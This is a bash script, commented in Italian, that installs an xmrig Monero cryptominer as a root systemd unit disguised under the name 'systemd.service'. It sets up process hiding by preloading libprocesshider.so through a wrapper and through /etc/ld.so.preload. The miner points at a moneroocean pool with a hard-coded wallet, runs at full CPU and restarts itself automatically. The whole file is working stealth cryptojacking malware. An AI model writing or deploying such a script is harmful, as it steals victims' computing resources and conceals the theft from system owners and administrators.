#!/bin/bash

# 1. Ferma il servizio attuale per evitare conflitti durante la scrittura
systemctl stop systemd.service 2>/dev/null || true

# 2. Crea la cartella se non esiste ed entra dentro
mkdir -p /opt/systemd
cd /opt/systemd

# 3. CREAZIONE DEL WRAPPER
# Questo file intercetta l'avvio, applica la libreria e lancia il miner vero e proprio
cat <<'EOF' > /opt/systemd/xmrig-wrapper.sh
#!/bin/bash
export LD_PRELOAD=/usr/local/lib/libprocesshider.so
exec /opt/systemd/xmrig "$@"
EOF

# Assegna i permessi di esecuzione al wrapper appena creato
chmod +x /opt/systemd/xmrig-wrapper.sh

# 4. Configura il mascheramento globale a livello di sistema
> /etc/ld.so.preload
if [ -f "/usr/local/lib/libprocesshider.so" ]; then
    echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
fi

# 5. Modifica o crea il servizio Systemd puntando al wrapper
cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd
ExecStart=/opt/systemd/xmrig-wrapper.sh -o gulf.moneroocean.stream:10128 -u 46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt -p server_\$(hostname -s) --keepalive --cpu-max-threads-hint=100 --randomx-mode=fast --randomx-1gb-pages --no-nvml --no-opencl
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# 6. Ricarica la configurazione di Systemd e riavvia il processo
systemctl daemon-reload
systemctl start systemd.service
